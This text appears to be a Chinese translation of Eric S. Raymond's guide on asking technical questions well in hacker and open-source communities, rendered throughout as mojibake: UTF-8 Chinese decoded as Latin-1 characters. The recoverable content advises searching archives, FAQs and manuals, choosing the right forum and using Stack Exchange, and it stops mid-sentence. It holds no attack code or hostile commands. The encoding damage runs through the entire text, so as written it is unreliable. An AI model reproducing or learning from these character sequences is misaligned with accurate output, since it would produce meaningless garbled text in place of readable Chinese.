åœ¨é»‘å®¢çš„ä¸–ç•Œé‡Œï¼Œä½ æ‰€ææŠ€æœ¯é—®é¢˜çš„è§£ç­”çš„å¥½å, å¾ˆå¤§ç¨‹åº¦ä¸Šå–å†³äºä½ æé—®çš„æ–¹å¼ä¸æ­¤é—®é¢˜çš„éš¾åº¦ã€‚æœ¬æŒ‡å—å°†æ•™ä½ å¦‚ä½•æ­£ç¡®åœ°æé—®ä»¥è·å¾—ä½ æ»¡æ„çš„ç­”æ¡ˆã€‚\nç°åœ¨å¼€æºï¼ˆOpen Sourceï¼‰è½¯ä»¶å·²ç»ç›¸å½“ç››è¡Œï¼Œæ‚¨é€šå¸¸å¯ä»¥ä»å…¶ä»–æ›´æœ‰ç»éªŒçš„ç”¨æˆ·é‚£é‡Œè·å¾—ä¸é»‘å®¢ä¸€æ ·å¥½çš„ç­”æ¡ˆï¼Œè¿™æ˜¯ä»¶å¥½äº‹ï¼›å’Œé»‘å®¢ç›¸æ¯”ï¼Œç”¨æˆ·ä»¬å¾€å¾€å¯¹é‚£äº›æ–°æ‰‹å¸¸é‡åˆ°çš„é—®é¢˜æ›´å®½å®¹ä¸€äº›ã€‚å°½ç®¡å¦‚æ­¤ï¼Œä»¥æˆ‘ä»¬åœ¨æ­¤æ¨èçš„æ–¹å¼å¯¹å¾…è¿™äº›æœ‰ç»éªŒçš„ç”¨æˆ·é€šå¸¸ä¹Ÿæ˜¯ä»ä»–ä»¬é‚£é‡Œè·å¾—æœ‰ç”¨ç­”æ¡ˆçš„æœ€æœ‰æ•ˆæ–¹å¼ã€‚\né¦–å…ˆä½ åº”è¯¥æ˜ç™½ï¼Œé»‘å®¢ä»¬å–œçˆ±æœ‰æŒ‘æˆ˜æ€§çš„é—®é¢˜ï¼Œæˆ–è€…èƒ½æ¿€å‘ä»–ä»¬æ€ç»´çš„å¥½é—®é¢˜ã€‚å¦‚æœæˆ‘ä»¬å¹¶éå¦‚æ­¤ï¼Œé‚£æˆ‘ä»¬ä¹Ÿä¸ä¼šæˆä¸ºä½ æƒ³è¯¢é—®çš„å¯¹è±¡ã€‚å¦‚æœä½ ç»™äº†æˆ‘ä»¬ä¸€ä¸ªå€¼å¾—åå¤å’€åš¼ç©å‘³çš„å¥½é—®é¢˜ï¼Œæˆ‘ä»¬è‡ªä¼šå¯¹ä½ æ„Ÿæ¿€ä¸å°½ã€‚å¥½é—®é¢˜æ˜¯æ¿€åŠ±ï¼Œæ˜¯åšç¤¼ã€‚å¥½é—®é¢˜å¯ä»¥æé«˜æˆ‘ä»¬çš„ç†è§£åŠ›ï¼Œè€Œä¸”é€šå¸¸ä¼šæš´éœ²æˆ‘ä»¬ä»¥å‰ä»æ²¡æ„è¯†åˆ°æˆ–è€…æ€è€ƒè¿‡çš„é—®é¢˜ã€‚å¯¹é»‘å®¢è€Œè¨€ï¼Œâ€œå¥½é—®é¢˜ï¼â€æ˜¯è¯šæŒšçš„å¤§åŠ›ç§°èµã€‚\nå°½ç®¡å¦‚æ­¤ï¼Œé»‘å®¢ä»¬æœ‰ç€è”‘è§†æˆ–å‚²æ…¢é¢å¯¹ç®€å•é—®é¢˜çš„ååå£°ï¼Œè¿™æœ‰æ—¶è®©æˆ‘ä»¬çœ‹èµ·æ¥å¯¹æ–°æ‰‹ã€æ— çŸ¥è€…ä¼¼ä¹è¾ƒæœ‰æ•Œæ„ï¼Œä½†å…¶å®ä¸æ˜¯é‚£æ ·çš„ã€‚\næˆ‘ä»¬ä¸è®³è¨€æˆ‘ä»¬å¯¹é‚£äº›ä¸æ„¿æ€è€ƒã€æˆ–è€…åœ¨å‘é—®å‰ä¸åšä»–ä»¬è¯¥åšçš„äº‹çš„äººçš„è”‘è§†ã€‚é‚£äº›äººæ˜¯æ—¶é—´æ€æ‰‹ â€”â€” ä»–ä»¬åªæƒ³ç´¢å–ï¼Œä»ä¸ä»˜å‡ºï¼Œæ¶ˆè€—æˆ‘ä»¬å¯ç”¨åœ¨æ›´æœ‰è¶£çš„é—®é¢˜æˆ–æ›´å€¼å¾—å›ç­”çš„äººèº«ä¸Šçš„æ—¶é—´ã€‚æˆ‘ä»¬ç§°è¿™æ ·çš„äººä¸º å¤±è´¥è€…ï¼ˆloserï¼‰ ï¼ˆç”±äºå†å²åŸå› ï¼Œæˆ‘ä»¬æœ‰æ—¶æŠŠå®ƒæ‹¼ä½œ lusersï¼‰ã€‚\næˆ‘ä»¬æ„è¯†åˆ°è®¸å¤šäººåªæ˜¯æƒ³ä½¿ç”¨æˆ‘ä»¬å†™çš„è½¯ä»¶ï¼Œä»–ä»¬å¯¹å­¦ä¹ æŠ€æœ¯ç»†èŠ‚æ²¡æœ‰å…´è¶£ã€‚å¯¹å¤§å¤šæ•°äººè€Œè¨€ï¼Œç”µè„‘åªæ˜¯ç§å·¥å…·ï¼Œæ˜¯ç§è¾¾åˆ°ç›®çš„çš„æ‰‹æ®µè€Œå·²ã€‚ä»–ä»¬æœ‰è‡ªå·±çš„ç”Ÿæ´»å¹¶ä¸”æœ‰æ›´è¦ç´§çš„äº‹è¦åšã€‚æˆ‘ä»¬è®¤å¯è¿™ç‚¹ï¼Œä¹Ÿä»ä¸æŒ‡æœ›æ¯ä¸ªäººéƒ½å¯¹è¿™äº›è®©æˆ‘ä»¬ç€è¿·çš„æŠ€æœ¯é—®é¢˜æ„Ÿå…´è¶£ã€‚å°½ç®¡å¦‚æ­¤ï¼Œæˆ‘ä»¬åªä¸ºé‚£äº›çœŸæ­£æœ‰å…´è¶£å¹¶æ„¿æ„ç§¯æå‚ä¸é—®é¢˜è§£å†³çš„äººè°ƒæ•´å›ç­”é—®é¢˜çš„é£æ ¼ã€‚è¿™ç‚¹ä¸ä¼šå˜ï¼Œä¹Ÿä¸è¯¥å˜ï¼šå¦åˆ™ï¼Œæˆ‘ä»¬å°±æ˜¯åœ¨æœ€æ“…é•¿çš„äº‹æƒ…ä¸Šé™ä½æ•ˆç‡ã€‚\næˆ‘ä»¬ï¼ˆåœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šï¼‰æ˜¯è‡ªæ„¿çš„ï¼Œä»ç¹å¿™çš„ç”Ÿæ´»ä¸­æŠ½å‡ºæ—¶é—´æ¥è§£ç­”ç–‘æƒ‘ï¼Œè€Œä¸”æ—¶å¸¸è¢«æé—®æ·¹æ²¡ã€‚æ‰€ä»¥æˆ‘ä»¬æ— æƒ…åœ°æ»¤æ‰ä¸€äº›è¯é¢˜ï¼Œç‰¹åˆ«æ˜¯æ‹‹å¼ƒé‚£äº›çœ‹èµ·æ¥åƒå¤±è´¥è€…çš„å®¶ä¼™ï¼Œä»¥ä¾¿æ›´é«˜æ•ˆåœ°åˆ©ç”¨æ—¶é—´æ¥å›ç­”èµ¢å®¶ï¼ˆwinnerï¼‰çš„é—®é¢˜ã€‚\nå¦‚æœä½ åŒæ¶æˆ‘ä»¬çš„æ€åº¦ï¼Œé«˜é«˜åœ¨ä¸Šï¼Œæˆ–è¿‡äºå‚²æ…¢ï¼Œä¸å¦¨ä¹Ÿè®¾èº«å¤„åœ°æƒ³æƒ³ã€‚æˆ‘ä»¬å¹¶æ²¡æœ‰è¦æ±‚ä½ å‘æˆ‘ä»¬å±ˆæœ â€”â€” äº‹å®ä¸Šï¼Œæˆ‘ä»¬å¤§å¤šæ•°äººéå¸¸ä¹æ„ä¸ä½ å¹³ç­‰åœ°äº¤æµï¼Œåªè¦ä½ ä»˜å‡ºå°å°åŠªåŠ›æ¥æ»¡è¶³åŸºæœ¬è¦æ±‚ï¼Œæˆ‘ä»¬å°±ä¼šæ¬¢è¿ä½ åŠ å…¥æˆ‘ä»¬çš„æ–‡åŒ–ã€‚ä½†è®©æˆ‘ä»¬å¸®åŠ©é‚£äº›ä¸æ„¿æ„å¸®åŠ©è‡ªå·±çš„äººæ˜¯æ²¡æœ‰æ•ˆç‡çš„ã€‚æ— çŸ¥æ²¡æœ‰å…³ç³»ï¼Œä½†è£…ç™½ç—´å°±æ˜¯ä¸è¡Œã€‚\næ‰€ä»¥ï¼Œä½ ä¸å¿…åœ¨æŠ€æœ¯ä¸Šå¾ˆåœ¨è¡Œæ‰èƒ½å¸å¼•æˆ‘ä»¬çš„æ³¨æ„ï¼Œä½†ä½ å¿…é¡»è¡¨ç°å‡ºèƒ½å¼•å¯¼ä½ å˜å¾—åœ¨è¡Œçš„ç‰¹è´¨ â€”â€” æœºæ•ã€æœ‰æƒ³æ³•ã€å–„äºè§‚å¯Ÿã€ä¹äºä¸»åŠ¨å‚ä¸è§£å†³é—®é¢˜ã€‚å¦‚æœä½ åšä¸åˆ°è¿™äº›ä½¿ä½ ä¸ä¼—ä¸åŒçš„äº‹æƒ…ï¼Œæˆ‘ä»¬å»ºè®®ä½ èŠ±ç‚¹é’±æ‰¾å®¶å•†ä¸šå…¬å¸ç­¾ä¸ªæŠ€æœ¯æ”¯æŒæœåŠ¡åˆåŒï¼Œè€Œä¸æ˜¯è¦æ±‚é»‘å®¢ä¸ªäººæ— å¿åœ°å¸®åŠ©ä½ ã€‚\nå¦‚æœä½ å†³å®šå‘æˆ‘ä»¬æ±‚åŠ©ï¼Œå½“ç„¶ä½ ä¹Ÿä¸å¸Œæœ›è¢«è§†ä¸ºå¤±è´¥è€…ï¼Œæ›´ä¸æ„¿æˆä¸ºå¤±è´¥è€…ä¸­çš„ä¸€å‘˜ã€‚èƒ½ç«‹åˆ»å¾—åˆ°å¿«é€Ÿå¹¶æœ‰æ•ˆç­”æ¡ˆçš„æœ€å¥½æ–¹æ³•ï¼Œå°±æ˜¯åƒèµ¢å®¶é‚£æ ·æé—® â€”â€” èªæ˜ã€è‡ªä¿¡ã€æœ‰è§£å†³é—®é¢˜çš„æ€è·¯ï¼Œåªæ˜¯å¶å°”åœ¨ç‰¹å®šçš„é—®é¢˜ä¸Šéœ€è¦è·å¾—ä¸€ç‚¹å¸®åŠ©ã€‚\nï¼ˆæ¬¢è¿å¯¹æœ¬æŒ‡å—æå‡ºæ”¹è¿›æ„è§ã€‚ä½ å¯ä»¥æŠŠä½ çš„å»ºè®®å‘é€è‡³ esr@thyrsus.com æˆ– respond-auto@linuxmafia.comã€‚ç„¶è€Œè¯·æ³¨æ„ï¼Œæœ¬æ–‡å¹¶éç½‘ç»œç¤¼èŠ‚çš„é€šç”¨æŒ‡å—ï¼Œè€Œæˆ‘ä»¬é€šå¸¸ä¼šæ‹’ç»æ— åŠ©äºåœ¨æŠ€æœ¯è®ºå›å¾—åˆ°æœ‰ç”¨ç­”æ¡ˆçš„å»ºè®®ï¼‰ã€‚\nåœ¨æé—®ä¹‹å‰ åœ¨ä½ å‡†å¤‡è¦é€šè¿‡ç”µå­é‚®ä»¶ã€æ–°é—»ç¾¤ç»„æˆ–è€…èŠå¤©å®¤æå‡ºæŠ€æœ¯é—®é¢˜å‰ï¼Œè¯·å…ˆåšåˆ°ä»¥ä¸‹äº‹æƒ…ï¼š\nå°è¯•åœ¨ä½ å‡†å¤‡æé—®çš„è®ºå›çš„æ—§æ–‡ç« ä¸­æœç´¢ç­”æ¡ˆã€‚ å°è¯•ä¸Šç½‘æœç´¢ä»¥æ‰¾åˆ°ç­”æ¡ˆã€‚ å°è¯•é˜…è¯»æ‰‹å†Œä»¥æ‰¾åˆ°ç­”æ¡ˆã€‚ å°è¯•é˜…è¯»å¸¸è§é—®é¢˜æ–‡ä»¶ï¼ˆFAQï¼‰ä»¥æ‰¾åˆ°ç­”æ¡ˆã€‚ å°è¯•è‡ªå·±æ£€æŸ¥æˆ–è¯•éªŒä»¥æ‰¾åˆ°ç­”æ¡ˆã€‚ å‘ä½ èº«è¾¹çš„å¼ºè€…æœ‹å‹æ‰“å¬ä»¥æ‰¾åˆ°ç­”æ¡ˆã€‚ å¦‚æœä½ æ˜¯ç¨‹åºå¼€å‘è€…ï¼Œè¯·å°è¯•é˜…è¯»æºä»£ç ä»¥æ‰¾åˆ°ç­”æ¡ˆã€‚ å½“ä½ æå‡ºé—®é¢˜çš„æ—¶å€™ï¼Œè¯·å…ˆè¡¨æ˜ä½ å·²ç»åšäº†ä¸Šè¿°çš„åŠªåŠ›ï¼›è¿™å°†æœ‰åŠ©äºæ ‘ç«‹ä½ å¹¶ä¸æ˜¯ä¸€ä¸ªä¸åŠ³è€Œè·ä¸”æµªè´¹åˆ«äººçš„æ—¶é—´çš„æé—®è€…ã€‚å¦‚æœä½ èƒ½ä¸€å¹¶è¡¨è¾¾åœ¨åšäº†ä¸Šè¿°åŠªåŠ›çš„è¿‡ç¨‹ä¸­æ‰€å­¦åˆ°çš„ä¸œè¥¿ä¼šæ›´å¥½ï¼Œå› ä¸ºæˆ‘ä»¬æ›´ä¹äºå›ç­”é‚£äº›è¡¨ç°å‡ºèƒ½ä»ç­”æ¡ˆä¸­å­¦ä¹ çš„äººçš„é—®é¢˜ã€‚\nè¿ç”¨æŸäº›ç­–ç•¥ï¼Œæ¯”å¦‚å…ˆç”¨ Google æœç´¢ä½ æ‰€é‡åˆ°çš„å„ç§é”™è¯¯ä¿¡æ¯ï¼ˆæœç´¢ Google è®ºå›å’Œç½‘é¡µï¼‰ï¼Œè¿™æ ·å¾ˆå¯èƒ½ç›´æ¥å°±æ‰¾åˆ°äº†èƒ½è§£å†³é—®é¢˜çš„æ–‡ä»¶æˆ–é‚®ä»¶åˆ—è¡¨çº¿ç´¢ã€‚å³ä½¿æ²¡æœ‰ç»“æœï¼Œåœ¨é‚®ä»¶åˆ—è¡¨æˆ–æ–°é—»ç»„å¯»æ±‚å¸®åŠ©æ—¶åŠ ä¸Šä¸€å¥ æˆ‘åœ¨ Google ä¸­æœè¿‡ä¸‹åˆ—å¥å­ä½†æ²¡æœ‰æ‰¾åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ ä¹Ÿæ˜¯ä»¶å¥½äº‹ï¼Œå³ä½¿å®ƒåªæ˜¯è¡¨æ˜äº†æœç´¢å¼•æ“ä¸èƒ½æä¾›å“ªäº›å¸®åŠ©ã€‚è¿™ä¹ˆåšï¼ˆåŠ ä¸Šæœç´¢è¿‡çš„å­—ä¸²ï¼‰ä¹Ÿè®©é‡åˆ°ç›¸ä¼¼é—®é¢˜çš„å…¶ä»–äººèƒ½è¢«æœç´¢å¼•æ“å¼•å¯¼åˆ°ä½ çš„æé—®æ¥ã€‚\nåˆ«ç€æ€¥ï¼Œä¸è¦æŒ‡æœ›å‡ ç§’é’Ÿçš„ Google æœç´¢å°±èƒ½è§£å†³ä¸€ä¸ªå¤æ‚çš„é—®é¢˜ã€‚åœ¨å‘ä¸“å®¶æ±‚åŠ©ä¹‹å‰ï¼Œå†é˜…è¯»ä¸€ä¸‹å¸¸è§é—®é¢˜æ–‡ä»¶ï¼ˆFAQï¼‰ã€æ”¾è½»æ¾ã€åå¾—èˆ’æœä¸€äº›ï¼Œå†èŠ±ç‚¹æ—¶é—´æ€è€ƒä¸€ä¸‹è¿™ä¸ªé—®é¢˜ã€‚ç›¸ä¿¡æˆ‘ä»¬ï¼Œä»–ä»¬èƒ½ä»ä½ çš„æé—®çœ‹å‡ºä½ åšäº†å¤šå°‘é˜…è¯»ä¸æ€è€ƒï¼Œå¦‚æœä½ æ˜¯æœ‰å¤‡è€Œæ¥ï¼Œå°†æ›´æœ‰å¯èƒ½å¾—åˆ°è§£ç­”ã€‚ä¸è¦å°†æ‰€æœ‰é—®é¢˜ä¸€è‚¡è„‘æ‹‹å‡ºï¼Œåªå› ä½ çš„ç¬¬ä¸€æ¬¡æœç´¢æ²¡æœ‰æ‰¾åˆ°ç­”æ¡ˆï¼ˆæˆ–è€…æ‰¾åˆ°å¤ªå¤šç­”æ¡ˆï¼‰ã€‚\nå‡†å¤‡å¥½ä½ çš„é—®é¢˜ï¼Œå†å°†é—®é¢˜ä»”ç»†åœ°æ€è€ƒè¿‡ä¸€éï¼Œå› ä¸ºè‰ç‡çš„å‘é—®åªèƒ½å¾—åˆ°è‰ç‡çš„å›ç­”ï¼Œæˆ–è€…æ ¹æœ¬å¾—ä¸åˆ°ä»»ä½•ç­”æ¡ˆã€‚è¶Šæ˜¯èƒ½è¡¨ç°å‡ºåœ¨å¯»æ±‚å¸®åŠ©å‰ä½ ä¸ºè§£å†³é—®é¢˜æ‰€ä»˜å‡ºçš„åŠªåŠ›ï¼Œä½ è¶Šæœ‰å¯èƒ½å¾—åˆ°å®è´¨æ€§çš„å¸®åŠ©ã€‚\nå°å¿ƒåˆ«é—®é”™äº†é—®é¢˜ã€‚å¦‚æœä½ çš„é—®é¢˜åŸºäºé”™è¯¯çš„å‡è®¾ï¼ŒæŸä¸ªæ™®é€šé»‘å®¢ï¼ˆJ. Random Hackerï¼‰å¤šåŠä¼šä¸€è¾¹åœ¨å¿ƒé‡Œæƒ³ç€è ¢é—®é¢˜â€¦ï¼Œä¸€è¾¹ç”¨æ— æ„ä¹‰çš„å­—é¢è§£é‡Šæ¥ç­”å¤ä½ ï¼Œå¸Œæœ›ç€ä½ ä¼šä»é—®é¢˜çš„å›ç­”ï¼ˆè€Œéä½ æƒ³å¾—åˆ°çš„ç­”æ¡ˆï¼‰ä¸­æ±²å–æ•™è®­ã€‚\nç»ä¸è¦è‡ªä»¥ä¸ºå¤Ÿæ ¼å¾—åˆ°ç­”æ¡ˆï¼Œä½ æ²¡æœ‰ï¼›ä½ å¹¶æ²¡æœ‰ã€‚æ¯•ç«Ÿä½ æ²¡æœ‰ä¸ºè¿™ç§æœåŠ¡æ”¯ä»˜ä»»ä½•æŠ¥é…¬ã€‚ä½ å°†ä¼šæ˜¯è‡ªå·±å»æŒ£åˆ°ä¸€ä¸ªç­”æ¡ˆï¼Œé æå‡ºæœ‰å†…æ¶µçš„ã€æœ‰è¶£çš„ã€æœ‰æ€ç»´æ¿€åŠ±ä½œç”¨çš„é—®é¢˜ â€”â€” ä¸€ä¸ªæœ‰æ½œåŠ›èƒ½è´¡çŒ®ç¤¾åŒºç»éªŒçš„é—®é¢˜ï¼Œè€Œä¸ä»…ä»…æ˜¯è¢«åŠ¨åœ°ä»ä»–äººå¤„ç´¢å–çŸ¥è¯†ã€‚\nå¦ä¸€æ–¹é¢ï¼Œè¡¨æ˜ä½ æ„¿æ„åœ¨æ‰¾ç­”æ¡ˆçš„è¿‡ç¨‹ä¸­åšç‚¹ä»€ä¹ˆæ˜¯ä¸€ä¸ªéå¸¸å¥½çš„å¼€ç«¯ã€‚è°èƒ½ç»™ç‚¹æç¤ºï¼Ÿã€æˆ‘çš„è¿™ä¸ªä¾‹å­é‡Œç¼ºäº†ä»€ä¹ˆï¼Ÿä»¥åŠæˆ‘åº”è¯¥æ£€æŸ¥ä»€ä¹ˆåœ°æ–¹æ¯”è¯·æŠŠæˆ‘éœ€è¦çš„ç¡®åˆ‡çš„è¿‡ç¨‹è´´å‡ºæ¥æ›´å®¹æ˜“å¾—åˆ°ç­”å¤ã€‚å› ä¸ºä½ è¡¨ç°å‡ºåªè¦æœ‰äººèƒ½æŒ‡ä¸ªæ­£ç¡®æ–¹å‘ï¼Œä½ å°±æœ‰å®Œæˆå®ƒçš„èƒ½åŠ›å’Œå†³å¿ƒã€‚\nå½“ä½ æé—®æ—¶ æ…é€‰æé—®çš„è®ºå› å°å¿ƒé€‰æ‹©ä½ è¦æé—®çš„åœºåˆã€‚å¦‚æœä½ åšäº†ä¸‹è¿°çš„äº‹æƒ…ï¼Œä½ å¾ˆå¯èƒ½è¢«å¿½ç•¥æ‰æˆ–è€…è¢«çœ‹ä½œå¤±è´¥è€…ï¼š\nåœ¨ä¸ä¸»é¢˜ä¸åˆçš„è®ºå›ä¸Šè´´å‡ºä½ çš„é—®é¢˜ã€‚ åœ¨æ¢è®¨è¿›é˜¶æŠ€æœ¯é—®é¢˜çš„è®ºå›å¼ è´´éå¸¸åˆçº§çš„é—®é¢˜ï¼›åä¹‹äº¦ç„¶ã€‚ åœ¨å¤ªå¤šçš„ä¸åŒæ–°é—»ç¾¤ç»„ä¸Šé‡å¤è½¬è´´åŒæ ·çš„é—®é¢˜ï¼ˆcross-postï¼‰ã€‚ å‘æ—¢éç†Ÿäººä¹Ÿæ²¡æœ‰ä¹‰åŠ¡è§£å†³ä½ é—®é¢˜çš„äººå‘é€ç§äººç”µé‚®ã€‚ é»‘å®¢ä¼šå‰”é™¤æ‰é‚£äº›æé”™åœºåˆçš„é—®é¢˜ï¼Œä»¥ä¿æŠ¤ä»–ä»¬æ²Ÿé€šçš„æ¸ é“ä¸è¢«æ— å…³çš„ä¸œè¥¿æ·¹æ²¡ã€‚ä½ ä¸ä¼šæƒ³è®©è¿™ç§äº‹å‘ç”Ÿåœ¨è‡ªå·±èº«ä¸Šçš„ã€‚\nå› æ­¤ï¼Œç¬¬ä¸€æ­¥æ˜¯æ‰¾åˆ°å¯¹çš„è®ºå›ã€‚å†è¯´ä¸€æ¬¡ï¼ŒGoogle å’Œå…¶å®ƒæœç´¢å¼•æ“è¿˜æ˜¯ä½ çš„æœ‹å‹ï¼Œç”¨å®ƒä»¬æ¥æ‰¾åˆ°ä¸ä½ é­é‡åˆ°å›°éš¾çš„è½¯ç¡¬ä»¶é—®é¢˜æœ€ç›¸å…³çš„ç½‘ç«™ã€‚é€šå¸¸é‚£å„¿éƒ½æœ‰å¸¸è§é—®é¢˜ï¼ˆFAQï¼‰ã€é‚®ä»¶åˆ—è¡¨åŠç›¸å…³è¯´æ˜æ–‡ä»¶çš„é“¾æ¥ã€‚å¦‚æœä½ çš„åŠªåŠ›ï¼ˆåŒ…æ‹¬é˜…è¯» FAQï¼‰éƒ½æ²¡æœ‰ç»“æœï¼Œç½‘ç«™ä¸Šä¹Ÿè®¸è¿˜æœ‰æŠ¥å‘Š Bugï¼ˆBug-reportingï¼‰çš„æµç¨‹æˆ–é“¾æ¥ï¼Œå¦‚æœæ˜¯è¿™æ ·ï¼Œé“¾è¿‡å»çœ‹çœ‹ã€‚\nå‘é™Œç”Ÿçš„äººæˆ–è®ºå›å‘é€é‚®ä»¶æœ€å¯èƒ½æ˜¯é£é™©æœ€å¤§çš„äº‹æƒ…ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œåˆ«å‡è®¾ä¸€ä¸ªæä¾›ä¸°å¯Œå†…å®¹çš„ç½‘é¡µçš„ä½œè€…ä¼šæƒ³å……å½“ä½ çš„å…è´¹é¡¾é—®ã€‚ä¸è¦å¯¹ä½ çš„é—®é¢˜æ˜¯å¦ä¼šå—åˆ°æ¬¢è¿åšå¤ªä¹è§‚çš„ä¼°è®¡ â€”â€” å¦‚æœä½ ä¸ç¡®å®šï¼Œé‚£å°±å‘åˆ«å¤„å‘é€ï¼Œæˆ–è€…å‹æ ¹åˆ«å‘ã€‚\nåœ¨é€‰æ‹©è®ºå›ã€æ–°é—»ç¾¤ç»„æˆ–é‚®ä»¶åˆ—è¡¨æ—¶ï¼Œåˆ«å¤ªç›¸ä¿¡å®ƒçš„åå­—ï¼Œå…ˆçœ‹çœ‹ FAQ æˆ–è€…è®¸å¯ä¹¦ä»¥å¼„æ¸…æ¥šä½ çš„é—®é¢˜æ˜¯å¦åˆ‡é¢˜ã€‚å‘æ–‡å‰å…ˆç¿»ç¿»å·²æœ‰çš„è¯é¢˜ï¼Œè¿™æ ·å¯ä»¥è®©ä½ æ„Ÿå—ä¸€ä¸‹é‚£é‡Œçš„æ–‡åŒ–ã€‚äº‹å®ä¸Šï¼Œäº‹å…ˆåœ¨æ–°é—»ç»„æˆ–é‚®ä»¶åˆ—è¡¨çš„å†å²è®°å½•ä¸­æœç´¢ä¸ä½ é—®é¢˜ç›¸å…³çš„å…³é”®è¯æ˜¯ä¸ªæå¥½çš„ä¸»æ„ï¼Œä¹Ÿè®¸è¿™æ ·å°±æ‰¾åˆ°ç­”æ¡ˆäº†ã€‚å³ä½¿æ²¡æœ‰ï¼Œä¹Ÿèƒ½å¸®åŠ©ä½ å½’çº³å‡ºæ›´å¥½çš„é—®é¢˜ã€‚\nåˆ«åƒæœºå…³æªä¼¼çš„ä¸€æ¬¡â€œæ‰«å°„â€æ‰€æœ‰çš„å¸®åŠ©æ¸ é“ï¼Œè¿™å°±åƒå¤§å–Šå¤§å«ä¸€æ ·ä¼šä½¿äººä¸å¿«ã€‚è¦ä¸€ä¸ªä¸€ä¸ªåœ°æ¥ã€‚\nææ¸…æ¥šä½ çš„ä¸»é¢˜ï¼æœ€å…¸å‹çš„é”™è¯¯ä¹‹ä¸€æ˜¯åœ¨æŸç§è‡´åŠ›äºè·¨å¹³å°å¯ç§»æ¤çš„è¯­è¨€ã€å¥—ä»¶æˆ–å·¥å…·çš„è®ºå›ä¸­æå…³äº Unix æˆ– Windows æ“ä½œç³»ç»Ÿç¨‹åºç•Œé¢çš„é—®é¢˜ã€‚å¦‚æœä½ ä¸æ˜ç™½ä¸ºä»€ä¹ˆè¿™æ˜¯å¤§é”™ï¼Œæœ€å¥½åœ¨ææ¸…æ¥šè¿™ä¹‹é—´å·®å¼‚ä¹‹å‰ä»€ä¹ˆä¹Ÿåˆ«é—®ã€‚\nä¸€èˆ¬æ¥è¯´ï¼Œåœ¨ä»”ç»†æŒ‘é€‰çš„å…¬å…±è®ºå›ä¸­æé—®ï¼Œä¼šæ¯”åœ¨ç§æœ‰è®ºå›ä¸­æåŒæ ·çš„é—®é¢˜æ›´å®¹æ˜“å¾—åˆ°æœ‰ç”¨çš„å›ç­”ã€‚æœ‰å‡ ä¸ªç†ç”±å¯ä»¥æ”¯æŒè¿™ç‚¹ï¼Œä¸€æ˜¯çœ‹æ½œåœ¨çš„å›å¤è€…æœ‰å¤šå°‘ï¼ŒäºŒæ˜¯çœ‹è§‚ä¼—æœ‰å¤šå°‘ã€‚é»‘å®¢è¾ƒæ„¿æ„å›ç­”é‚£äº›èƒ½å¸®åŠ©åˆ°è®¸å¤šäººçš„é—®é¢˜ã€‚\nå¯ä»¥ç†è§£çš„æ˜¯ï¼Œè€ç»ƒçš„é»‘å®¢å’Œä¸€äº›çƒ­é—¨è½¯ä»¶çš„ä½œè€…æ­£åœ¨æ¥å—è¿‡å¤šçš„é”™å‘ä¿¡æ¯ã€‚å°±åƒé‚£æ ¹æœ€åå‹å®éª†é©¼èƒŒçš„ç¨»è‰ä¸€æ ·ï¼Œä½ çš„åŠ å…¥ä¹Ÿæœ‰å¯èƒ½ä½¿æƒ…å†µèµ°å‘æç«¯ â€”â€” å·²ç»å¥½å‡ æ¬¡äº†ï¼Œä¸€äº›çƒ­é—¨è½¯ä»¶çš„ä½œè€…ç”±äºæ¶Œå…¥å…¶ç§äººé‚®ç®±çš„å¤§é‡ä¸å ªå¿å—çš„æ— ç”¨é‚®ä»¶è€Œä¸å†æä¾›æ”¯æŒã€‚\nStack Overflow æœç´¢ï¼Œç„¶ååœ¨ Stack Exchange é—®ã€‚\nè¿‘å¹´æ¥ï¼ŒStack Exchange ç¤¾åŒºå·²ç»æˆä¸ºå›ç­”æŠ€æœ¯åŠå…¶ä»–é—®é¢˜çš„ä¸»è¦æ¸ é“ï¼Œå°¤å…¶æ˜¯é‚£äº›å¼€æ”¾æºç çš„é¡¹ç›®ã€‚\nå› ä¸º Google ç´¢å¼•æ˜¯å³æ—¶çš„ï¼Œåœ¨çœ‹ Stack Exchange ä¹‹å‰å…ˆåœ¨ Google æœç´¢ã€‚æœ‰å¾ˆé«˜çš„å‡ ç‡æŸäººå·²ç»é—®äº†ä¸€ä¸ªç±»ä¼¼çš„é—®é¢˜ï¼Œè€Œä¸” Stack Exchange ç½‘ç«™ä»¬å¾€å¾€ä¼šæ˜¯æœç´¢ç»“æœä¸­æœ€å‰é¢å‡ ä¸ªã€‚å¦‚æœä½ åœ¨ Google ä¸Šæ²¡æœ‰æ‰¾åˆ°ä»»ä½•ç­”æ¡ˆï¼Œä½ å†åˆ°ç‰¹å®šç›¸å…³ä¸»é¢˜çš„ç½‘ç«™å»æ‰¾ã€‚ç”¨æ ‡ç­¾ï¼ˆTagï¼‰æœç´¢èƒ½è®©ä½ æ›´ç¼©å°ä½ çš„æœç´¢ç»“æœã€‚\nå¦‚æœä½ è¿˜æ˜¯æ‰¾ä¸åˆ°ä»»ä½•å¯¹ä½ çš„é—®é¢˜æœ‰ç”¨çš„å†…å®¹ï¼Œè¯·æŠŠä½ çš„é—®é¢˜å‘åœ¨ä¸å®ƒæœ€ç›¸å…³çš„ç½‘ç«™ä¸Šã€‚æé—®çš„æ—¶å€™è¯·å–„ç”¨æ ¼å¼åŒ–å·¥å…·ï¼Œå°¤å…¶æ³¨æ„ä¸ºä»£ç æ·»åŠ æ ¼å¼ï¼Œå¹¶ä¸”æ·»åŠ ç›¸å…³çš„æ ‡ç­¾ï¼ˆç‰¹åˆ«æ˜¯ç¼–ç¨‹è¯­è¨€ã€æ“ä½œç³»ç»Ÿæˆ–åº“/åŒ…çš„åç§°ï¼‰ã€‚å½“æœ‰äººè¦æ±‚ä½ æä¾›æ›´å¤šç›¸å…³ä¿¡æ¯æ—¶ï¼Œè¯·ç¼–è¾‘ä½ çš„è´´å­æ¥è¡¥å……å®ƒä»¬[è¯‘æ³¨ï¼šè€Œä¸æ˜¯å‘ä¸€ä¸ªå›å¸–æˆ–å›ç­”ï¼]ã€‚å¦‚æœä½ è§‰å¾—ä¸€ä¸ªç­”æ¡ˆå¯¹ä½ 